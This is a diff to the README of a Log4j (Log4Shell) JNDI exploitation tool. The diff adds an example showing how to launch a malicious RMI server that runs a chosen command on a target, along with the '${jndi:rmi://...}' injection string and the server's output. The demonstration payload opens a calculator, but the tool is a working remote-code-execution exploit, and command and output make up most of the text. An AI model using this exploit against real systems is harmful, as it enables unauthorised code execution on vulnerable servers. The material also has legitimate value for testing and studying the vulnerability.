@@ -44,4 +44,12 @@ You must indicate the command you want to run in the target.
 
 `Injection: {jndi:rmi://<RMI_IP>:<RMI_PORT>/Foo}`
 
+## Example
 
+```shell
+$ java -jar Log4j-JNDIServer-1.0-SNAPSHOT-all.jar 3 127.0.0.1 1389 /usr/bin/gnome-calculator
+- Starting RMI Server for Tomcat  -
+- Creating RMI Server on port 1389 -
+- Reference bound! -
+- RMI server started at 127.0.0.1:1389 -
+- Log4J Injection Path: ${jndi:rmi://127.0.0.1:1389/Foo} -
